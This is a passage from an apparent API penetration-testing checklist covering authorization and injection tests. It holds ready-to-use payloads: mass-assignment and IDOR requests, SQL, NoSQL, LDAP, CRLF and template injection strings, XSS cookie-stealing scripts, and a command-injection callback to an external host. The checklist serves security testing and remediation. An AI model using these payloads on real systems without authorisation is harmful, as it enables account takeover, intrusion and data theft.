**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0243 — HTTP Method Override
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Update Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Send POST with X-HTTP-Method-Override: PUT<br>2. Bypass method restrictions<br>3. Check if processed

**Expected Result:** Should disable or properly validate method override

**Payload / PoC Example:**

```
POST /api/admin/users with X-HTTP-Method-Override: DELETE
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0244 — Partial Update Exploitation
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Update Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Use PATCH to update single field<br>2. Include protected fields<br>3. Check what gets updated

**Expected Result:** Should only update allowed fields in PATCH

**Payload / PoC Example:**

```
PATCH /users/1 {"role":"admin"}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0245 — Version Conflict Exploitation
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Update Resource — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Read resource with version/ETag<br>2. Modify and submit stale version<br>3. Check for proper conflict handling

**Expected Result:** Should implement optimistic locking

**Payload / PoC Example:**

```
Submit update with outdated version
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0246 — Account Takeover via Email Change without Verification
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Login as attacker<br>2. Change email to victim's email via PUT /profile<br>3. Request password reset for victim email

**Expected Result:** Email change requires verification of new address; cannot set to existing email

**Payload / PoC Example:**

```
PUT /api/profile {"email":"victim@target.com"}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0247 — Mass Assignment via HTTP PATCH - BOPLA
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Send PATCH with sensitive fields: isAdmin, verified, tier<br>2. Try object property fields not in API docs<br>3. Check which fields are bound and applied

**Expected Result:** PATCH uses strict allowlist; unlisted fields silently ignored

**Payload / PoC Example:**

```
PATCH /api/users/me {"isAdmin":true,"verified":true,"subscriptionTier":"enterprise","internalScore":100}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite, Autorize

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0248 — BOPLA - Read Sensitive Properties
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Request resource with all fields<br><br>2. Check for sensitive properties in response<br><br>3. Add fields parameter to request hidden properties<br><br>4. Analyze response for PII/secrets

**Expected Result:** Should filter sensitive properties based on role

**Payload / PoC Example:**

```
GET /api/users/1?fields=password_hash
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0249 — BOPLA - Write Protected Properties
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Update resource normally<br><br>2. Add protected properties to update request<br><br>3. Include role/permissions/balance fields<br><br>4. Check if properties modified

**Expected Result:** Should ignore or reject protected properties

**Payload / PoC Example:**

```
PUT /api/profile {"balance":99999,"role":"admin"}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0250 — BOPLA - GraphQL Field Access
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Query object with sensitive fields<br><br>2. Request fields not meant for current role<br><br>3. Check if resolver returns sensitive data<br><br>4. Test across different user roles

**Expected Result:** Should enforce field-level authorization

**Payload / PoC Example:**

```
query {user(id:1) {ssn creditCard salary}}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** GraphQL Voyager

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0251 — BOPLA - Partial Update Exploitation
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Use PATCH to update resource<br><br>2. Include mix of allowed and protected fields<br><br>3. Check which fields get updated<br><br>4. Verify protected fields unchanged

**Expected Result:** Should validate each field in partial updates

**Payload / PoC Example:**

```
PATCH /api/users/1 {"name":"John","isAdmin":true}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0252 — Account Takeover via Email Change
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** PUT Profile Update — Request-body properties (mass assignment / extra fields)

**Test Steps:** 1. Login as attacker<br>2. PUT /api/profile with email=victim@target.com<br>3. Request password reset for that email<br>4. Reset link goes to attacker's session

**Expected Result:** Email change triggers verification of new address; cannot claim existing email

**Payload / PoC Example:**

```
PUT /api/users/me HTTP/1.1
Authorization: Bearer <attacker_token>
{"email": "victim@target.com", "name": "Attacker"}

# Or via PATCH
PATCH /api/profile
{"email": "admin@target.com"}

# Variation – add unicode lookalike
{"email": "аdmin@target.com"}  # Cyrillic 'а' != ASCII 'a'
{"email": "victim+hacker@target.com"}
```

**Impact:** Mass-assignment/excessive-data-exposure of restricted properties

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API3:2023 Broken Object Property Level Authorization

---

## API-0253 — Cross-tenant write via tenant_id/owner_id mass assignment
**Phase:** 6-Authorization · **Category:** BOPLA · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create/update request body — inject ownership/tenant fields the UI never sends

**Test Steps:** 1. Capture a create/update request<br>2. Add owner_id/tenant_id/org_id/account_id set to a VICTIM tenant's value<br>3. Send with your token<br>4. Re-GET; confirm the object was written into another tenant

**Expected Result:** Server ignores client-supplied ownership/tenant fields (server-derived only)

**Payload / PoC Example:**

```
PATCH /api/v1/resource/1 {"owner_id":<victim>,"tenant_id":<victim_org>}
```

**Impact:** Cross-tenant write via mass assignment -&gt; multi-tenant data breach / takeover

**Tools:** Burp Suite, massassign_fuzz.py

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3; REST_API TESTING_GUIDE §7.2; API3:2023 Broken Object Property Level Authorization

---

## API-0254 — IDOR - Access Other User Profiles
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — Direct object reference (ID in path/param/body)

**Test Steps:** 1. Login as User A<br>2. Try to view/update User B's profile<br>3. Change userId parameter

**Expected Result:** Should only allow access to own profile

**Payload / PoC Example:**

```
PUT /api/users/2/profile (while logged in as user 1)
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0255 — IDOR - Read Other Users' Data
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Read Resource — Direct object reference (ID in path/param/body)

**Test Steps:** 1. Login as User A<br>2. Try to GET User B's resources<br>3. Enumerate IDs

**Expected Result:** Should only return authorized resources

**Payload / PoC Example:**

```
GET /api/users/2/orders (while logged as user 1)
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0256 — IDOR - Update Other Users' Data
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Update Resource — Direct object reference (ID in path/param/body)

**Test Steps:** 1. Login as User A<br>2. Try to UPDATE User B's resources<br>3. Modify ID in request

**Expected Result:** Should validate ownership

**Payload / PoC Example:**

```
PUT /api/posts/123 {data} (post belongs to different user)
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0257 — IDOR - Delete Other Users' Data
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delete Resource — Direct object reference (ID in path/param/body)

**Test Steps:** 1. Login as User A<br>2. Try to DELETE User B's resources<br>3. Enumerate IDs

**Expected Result:** Should validate ownership before deletion

**Payload / PoC Example:**

```
DELETE /api/posts/123 (belongs to different user)
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0258 — IDOR - Access Others' Transactions
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Direct object reference (ID in path/param/body)

**Test Steps:** 1. Get transaction ID of User A<br>2. Login as User B<br>3. Try accessing User A's transaction

**Expected Result:** Should validate transaction ownership

**Payload / PoC Example:**

```
GET /api/transactions/123 (belongs to different user)
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0259 — GraphQL Subscription IDOR - Real-time Data Leak
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Direct object reference (ID in path/param/body)

**Test Steps:** 1. Subscribe to real-time events via GraphQL subscription<br>2. Modify subscription filter to include other users' object IDs<br>3. Check if unauthorized events received

**Expected Result:** Subscription resolver validates object ownership; events scoped to auth user

**Payload / PoC Example:**

```
subscription { orderUpdates(orderId: "VICTIM-ORDER-ID") { status total } }
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite, graphql-ws client

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0260 — WebSocket IDOR
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Direct object reference (ID in path/param/body)

**Test Steps:** 1. Establish WebSocket connection<br><br>2. Subscribe to other users' channels<br><br>3. Access unauthorized data streams<br><br>4. Check authorization per channel

**Expected Result:** Should validate authorization for subscriptions

**Payload / PoC Example:**

```
{""subscribe"":""user_2_private_channel""}
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0261 — GraphQL Subscription IDOR
**Phase:** 6-Authorization · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Direct object reference (ID in path/param/body)

**Test Steps:** 1. Subscribe to real-time events via GraphQL subscription<br>2. Modify subscription variables to victim's order/message ID<br>3. Check if server sends unauthorized events<br>4. Try subscribing to admin-only event types

**Expected Result:** Subscription resolver validates object ownership per message; events scoped to authenticated user

**Payload / PoC Example:**

```
# Subscribe to victim's order updates
subscription {
  orderUpdated(orderId: "VICTIM-ORDER-ID") {
    status
    total
    shippingAddress
    paymentDetails
  }
}

# Subscribe to all user notifications (no ID filter)
subscription {
  newMessage {
    id
    from
    content
    recipientId
  }
}

# Admin event subscription as regular user
subscription {
  adminAlert {
    type
    affectedUserId
    sensitiveData
  }
}

# Batch subscription abuse – open 1000 connections
for i in range(1000):
    ws.send('{"type":"subscribe","payload":{"query":"subscription{orderUpdated(id:\"ORD-'+str(i)+'\"){ status }}"}}')
```

**Impact:** Direct object reference lets attacker access others' records

**Tools:** Burp Suite, graphql-ws client

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0262 — BOLA via base64 / hashids / Mongo ObjectId predictable
**Phase:** 6-Authorization · **Category:** Injection · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET JSON body operators (query/filter fields)

**Test Steps:** 1. Decode object ID format<br>2. Enumerate by altering decoded fields<br>3. Verify access

**Expected Result:** Use unpredictable opaque IDs

**Payload / PoC Example:**

```
base64("User:1") -> base64("User:2")
```

**Impact:** Cross-tenant data leak

**Tools:** manual

**References:** -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL; OWASP API Top 10; API1:2023 Broken Object Level Authorization

---

## API-0263 — Tenant ID swap in JWT/header
**Phase:** 6-Authorization · **Category:** JWT · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture token containing tenantId<br>2. Modify header X-Tenant-Id or JWT claim<br>3. Read victim tenant data

**Expected Result:** Bind tenant server-side from auth context

**Payload / PoC Example:**

```
X-Tenant-Id: 2
```

**Impact:** Multi-tenant data breach

**Tools:** Burp Suite,jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API1:2023 Broken Object Level Authorization

---

## API-0264 — SQL injection in search/filter
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Request params / JSON body / query filters

**Test Steps:** 1. Inject ' UNION SELECT password FROM users-- -<br>2. Time-based: ' AND SLEEP(5)-- -<br>3. sqlmap -r req.txt --level 5 --risk 3

**Expected Result:** Use parameterized queries

**Payload / PoC Example:**

```
GET /api/search?q=' UNION SELECT password,user FROM users-- -
```

**Impact:** Full DB read

**Tools:** sqlmap,Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0265 — NoSQL operator injection in filters
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET JSON body operators (query/filter fields)

**Test Steps:** 1. Send ?name[$regex]=.*&amp;price[$gt]=0<br>2. Test $where with JS function<br>3. Blind regex char-by-char

**Expected Result:** Validate types

**Payload / PoC Example:**

```
?name[$regex]=^a&price[$gt]=0
```

**Impact:** Full collection read

**Tools:** NoSQLMap,Burp

**References:** -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL; OWASP API Top 10; API8:2023 Security Misconfiguration

---

## API-0266 — OS command injection (RCE)
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Params passed to OS/command execution

**Test Steps:** 1. Inject ;id |id $(id) `id` and time-based ;sleep 10<br>2. OOB confirm via interactsh<br>3. commix automated exploit

**Expected Result:** Avoid shell; use parameterized exec

**Payload / PoC Example:**

```
; curl http://UNIQ.oast.fun/
```

**Impact:** RCE -&gt; server takeover

**Tools:** commix,interactsh

**References:** -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger Academy; PayloadsAllTheThings; GTFOBins; API8:2023 Security Misconfiguration

---

## API-0267 — Server-side template injection
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Template-rendered input fields

**Test Steps:** 1. Submit ${{&lt;%[%'"}}%\\. polyglot<br>2. Confirm engine: {{7*7}} or ${7*7} or &lt;%=7*7%&gt;<br>3. Escalate via tplmap

**Expected Result:** Don't render user input as template

**Payload / PoC Example:**

```
{{7*7}} -> 49
```

**Impact:** RCE on template engine

**Tools:** tplmap,Burp

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0268 — LDAP injection in directory queries
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Inject *)(uid=*))(|(uid=*<br>2. Auth bypass *)(&amp;(password=*)<br>3. Enumerate via wildcards

**Expected Result:** Sanitize LDAP input

**Payload / PoC Example:**

```
*)(uid=*))
```

**Impact:** Directory dump / auth bypass

**Tools:** Burp,manual

**References:** -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings; PortSwigger; API8:2023 Security Misconfiguration

---

## API-0269 — CRLF injection in header reflected fields
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Inject %0d%0a in fields reflected to Location/Set-Cookie<br>2. Smuggle headers/Set-Cookie<br>3. Cache poisoning chain

**Expected Result:** Sanitize header values

**Payload / PoC Example:**

```
lang=en%0d%0aSet-Cookie:%20admin=1
```

**Impact:** Cache poison + session fixation

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0270 — XSS in Profile Fields
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Profile Update — API request / relevant parameter

**Test Steps:** 1. Update profile with XSS payload<br>2. View profile page<br>3. Check if script executes

**Expected Result:** Should sanitize and encode output

**Payload / PoC Example:**

```
bio: <script>alert(document.cookie)</script>
```

**Impact:** Script execution in victim context; session/token theft

**Tools:** Burp Suite

**References:** -&gt;[XSS checklist](#/checklist/xss); PortSwigger Research XSS (Gareth Heyes); OWASP API Top 10; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0271 — SQL Injection in Profile Update
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — Request params / JSON body / query filters

**Test Steps:** 1. Update profile fields with SQL payloads<br>2. Check for errors<br>3. Attempt data exfiltration

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
name: admin' OR '1'='1' --
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0272 — Stored XSS via Filename
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** File Upload — API request / relevant parameter

**Test Steps:** 1. Upload file with XSS in filename<br>2. View file list<br>3. Check if script executes

**Expected Result:** Should sanitize filename display

**Payload / PoC Example:**

```
filename: <script>alert('XSS')</script>.jpg
```

**Impact:** Script execution in victim context; session/token theft

**Tools:** Burp Suite

**References:** -&gt;[XSS checklist](#/checklist/xss); PortSwigger Research XSS (Gareth Heyes); OWASP API Top 10; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0273 — SQL Injection in Create
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create Resource — Request params / JSON body / query filters

**Test Steps:** 1. Send POST with SQL payload in fields<br>2. Check for SQL errors<br>3. Attempt injection

**Expected Result:** Should use parameterized queries

**Payload / PoC Example:**

```
title: Test' OR '1'='1' --
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** SQLMap

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0274 — NoSQL Injection in Create
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Create Resource — Request params / JSON body / query filters

**Test Steps:** 1. Send NoSQL operators in JSON<br>2. Try query manipulation<br>3. Check behavior

**Expected Result:** Should validate input types

**Payload / PoC Example:**

```
{"title": {"$ne": null}}
```

**Impact:** DB read/modify, authN bypass, potential RCE via SQL injection

**Tools:** Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0275 — XSS in Created Content
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Create Resource — API request / relevant parameter

**Test Steps:** 1. Create resource with XSS payload<br>2. View resource<br>3. Check if executes

**Expected Result:** Should sanitize and encode

**Payload / PoC Example:**

```
POST /posts {"content":"<script>alert(1)</script>"}
```

**Impact:** Script execution in victim context; session/token theft

**Tools:** Burp Suite

**References:** -&gt;[XSS checklist](#/checklist/xss); PortSwigger Research XSS (Gareth Heyes); OWASP API Top 10; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0276 — SQL Injection in Read/Search
**Phase:** 7-Injection · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Read Resource — Request params / JSON body / query filters

